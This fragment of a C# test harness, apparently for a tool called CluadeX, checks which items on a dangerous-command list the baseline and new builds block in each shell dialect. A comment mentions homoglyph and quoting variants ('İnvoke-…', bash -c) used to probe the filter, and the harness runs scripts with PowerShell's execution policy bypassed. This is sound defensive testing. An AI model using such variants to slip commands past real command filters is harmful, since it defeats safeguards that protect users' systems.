                // blocks. The rest are text in the dialects that leave them out (PG17z, PG17g2, PG19y), or never ran
                // in the baseline either (İnvoke-…: no such cmdlet; cmd reads bash -c "…" strictly, quotes and all).
                Console.WriteLine($"  info  DIFF the baseline let {dangerous.Count - baseBlocked} of these through; the new build blocks {newOnly} of them in every dialect, and these only in some:");
                foreach (var c in dangerous.Where(c => !BaseBlocks(c) && !dialects.All(d => NewBlocks(c, d))))
                    Console.WriteLine($"            [{Q(c)}] blocked in: {string.Join(", ", dialects.Where(d => NewBlocks(c, d)).DefaultIfEmpty((D)(-1)).Select(d => (int)d < 0 ? "none" : d.ToString()))}");
            }
            finally { settings.Settings.Features.DangerousCommandBlocking = keep; }
            await Task.CompletedTask;
        });
    }

    /// <summary>The baseline CluadeX.dll in its own load context; everything else it needs comes from this process.</summary>
    sealed class BaselineContext(string dir) : AssemblyLoadContext("cluadex-baseline")
    {
        protected override Assembly Load(AssemblyName name)
            => name.Name == "CluadeX" ? LoadFromAssemblyPath(Path.Combine(Path.GetFullPath(dir), "CluadeX.dll")) : null;
    }

    /// <summary>Windows PowerShell 5.1 running a .ps1 — what the code-block runner does — returning its output.</summary>
    static string RunPs51(string file)
    {
        var psi = new ProcessStartInfo("powershell.exe", $"-NoProfile -ExecutionPolicy Bypass -File \"{file}\"")
        { UseShellExecute = false, CreateNoWindow = true, RedirectStandardOutput = true, RedirectStandardError = true };
        using var p = Process.Start(psi)!;
        var err = p.StandardError.ReadToEndAsync();
        string output = p.StandardOutput.ReadToEnd();
        p.WaitForExit(30000);
        return output + err.Result;
    }

    /// <summary>The HTML stripper as it was (three regexes) — the reference the linear one must match.</summary>
    static string OldStripHtml(string html)
    {
        html = Regex.Replace(html, @"<(script|style)[^>]*>[\s\S]*?</\1>", "", RegexOptions.IgnoreCase);
        html = Regex.Replace(html, @"<[^>]+>", " ");
        html = Regex.Replace(html, @"\s+", " ");
        html = System.Net.WebUtility.HtmlDecode(html);
        return html.Trim();
    }
}
